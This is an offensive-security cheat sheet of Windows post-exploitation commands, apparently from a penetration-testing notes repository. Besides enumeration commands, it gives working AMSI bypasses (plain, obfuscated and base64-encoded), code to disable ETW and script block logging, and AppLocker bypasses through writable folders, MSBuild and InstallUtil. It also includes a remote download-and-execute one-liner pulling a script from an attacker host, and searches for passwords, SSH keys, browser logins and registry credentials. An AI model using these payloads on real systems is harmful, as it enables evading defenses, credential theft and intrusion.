# Windows Command

## Table of Contents

- [User Enumeration](#user-enumeration)
- [System Information](#system-information)
- [Network Enumeration](#network-enumeration)
- [Process and Service Enumeration](#process-and-service-enumeration)
- [Share Enumeration](#share-enumeration)
- [Remote Command Execution](#remote-command-execution)
- [PowerShell Remoting Cmdlets](#powershell-remoting-cmdlets)
- [Defense Evasion](#defense-evasion)
  - [AMSI Bypass](#amsi-bypass)
  - [ETW Bypass](#etw-bypass)
  - [Script Block Logging Bypass](#script-block-logging-bypass)
  - [AppLocker Bypass](#applocker-bypass)
- [File Hunting](#file-hunting)

---

## User Enumeration

### Quick Check (One-liner)

```powershell
# Quick Windows enumeration
whoami /all && net user && net localgroup administrators && systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

- List local users

    ```shell
    Get-LocalUser
    ```

- List domain users

    ```powershell
    Get-ADUser -Filter *
    ```

- Get current user

    ```shell
    whoami
    $env:USERNAME
    ```

- Get user groups

    ```shell
    whoami /groups
    Get-LocalGroup
    Get-ADGroupMember "Domain Admins"
    ```

---

## System Information

```shell
systeminfo
Get-ComputerInfo
```

- OS version

    ```shell
    [System.Environment]::OSVersion
    Get-WmiObject Win32_OperatingSystem
    ```

- Architecture

    ```shell
    [System.Environment]::Is64BitOperatingSystem
    $env:PROCESSOR_ARCHITECTURE
    ```

- Hostname

    ```shell
    hostname
    $env:COMPUTERNAME
    ```

- Domain information

    ```shell
    Get-WmiObject Win32_ComputerSystem | Select Domain
    ```

---

## Network Enumeration

- Network interfaces

    ```shell
    ipconfig /all
    Get-NetIPAddress
    Get-NetIPConfiguration
    ```

- Routing table

    ```shell
    route print
    Get-NetRoute
    ```

- ARP table

    ```shell
    arp -a
    Get-NetNeighbor
    ```

- Active connections

    ```shell
    netstat -ano
    Get-NetTCPConnection
    ```

- DNS cache

    ```shell
    ipconfig /displaydns
    Get-DnsClientCache
    ```

---

## Process and Service Enumeration

- List running processes

    ```shell
    Get-Process
    tasklist /v
    ```

- Enumerate Windows services

    ```shell
    Get-Service
    sc query
    ```

- List scheduled tasks

    ```shell
    Get-ScheduledTask
    schtasks /query /fo LIST /v
    ```

- List startup programs

    ```shell
    Get-CimInstance Win32_StartupCommand
    wmic startup get caption,command
    ```

---

## Share Enumeration

- List shares

    ```shell
    net share
    Get-SmbShare
    Get-WmiObject Win32_Share
    ```

- Access shares

    ```shell
    net use \\target\share
    Get-SmbMapping
    ```

- Find accessible shares on network

    ```shell
    Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
    ```

---

## Remote Command Execution

- Basic command execution

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami }
    ```

- Multiple commands

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami hostname ipconfig }
    ```

- Execute local script on remote

    ```shell
    Invoke-Command -ComputerName $rhost -FilePath .\script.ps1
    ```

- Download and execute

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("http://$lhost/script.ps1")}
    ```

---

## PowerShell Remoting Cmdlets

- Interactive Remote Session

    ```shell
    Enter-PSSession -ComputerName $rhost
    ```

- Exit Remote Session

    ```shell
    Exit-PSSession
    ```

- Run Command Remotely

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {cmd}
    ```

- Create persistent session

    ```shell
    $s = New-PSSession -ComputerName $rhost
    ```

- Close session

    ```shell
    Remove-PSSession -Session $s
    ```

- List active sessions

    ```shell
    Get-PSSession
    ```

---

## Defense Evasion

### AMSI Bypass

> Bypass Antimalware Scan Interface to run malicious PowerShell

#### Memory Patching (One-liner)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Obfuscated Version

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

#### Matt Graeber's Method

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### Base64 Encoded One-liner

```powershell
powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbGBsACwAJAB0AHIAdQBlACkA
```

#### Using Invisi-Shell

```powershell
# Run PowerShell without logging or AMSI
.\RunWithPathAsAdmin.bat
.\RunWithRegistryNonAdmin.bat
```

---

### ETW Bypass

> Disable Event Tracing for Windows

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

---

### Script Block Logging Bypass

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

---

### AppLocker Bypass

#### Common Bypass Directories

```powershell
# Default writable locations
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\com\dmp
```

#### Execute from Bypass Locations

```cmd
copy payload.exe C:\Windows\Tasks\
C:\Windows\Tasks\payload.exe
```

#### MSBuild Bypass

```cmd
# Create .csproj file with embedded payload
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

#### InstallUtil Bypass

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

---

## File Hunting

> Search for sensitive files on Windows systems

### Search for Passwords

```cmd
:: Search in current directory recursively
findstr /si password *.txt *.xml *.ini *.config *.cfg

:: Search in specific paths
findstr /spin "password" C:\Users\*.* 2>nul
findstr /spin "password" C:\inetpub\*.* 2>nul

:: Case-insensitive search for multiple terms
findstr /si /c:"password" /c:"passwd" /c:"pwd" /c:"secret" *.* 2>nul
```

### PowerShell File Search

```powershell
# Search for files containing passwords
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|passwd|pwd|secret" | Select-Object Path,LineNumber,Line

# Find specific file types
Get-ChildItem -Path C:\ -Include *.kdbx,*.pfx,*.p12,*.ppk,*.pem -Recurse -ErrorAction SilentlyContinue

# Find files modified recently
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | 
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}
```

### Common Sensitive Files

```cmd
:: Find config files
dir /s /b *.config *.ini *.xml *.txt 2>nul | findstr /i "password web.config app.config"

:: Find credential files
dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*secret* 2>nul

:: Find SSH keys
dir /s /b C:\Users\*.ppk C:\Users\id_rsa C:\Users\.ssh 2>nul

:: Find browser credentials
dir /s /b "%APPDATA%\Microsoft\Credentials\*" 2>nul
dir /s /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul
```

### Registry Credential Search

```cmd
:: Search registry for passwords
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

:: Common credential locations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 2>nul
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul
```

---

## See Also

- **[Linux Command](6.2.Linux-command.md)** - Linux system commands
- **[Reverse Shell](6.3.Reverse-Shell.md)** - Shell payloads for Windows and Linux
- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Windows privesc techniques
- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Active Directory attacks
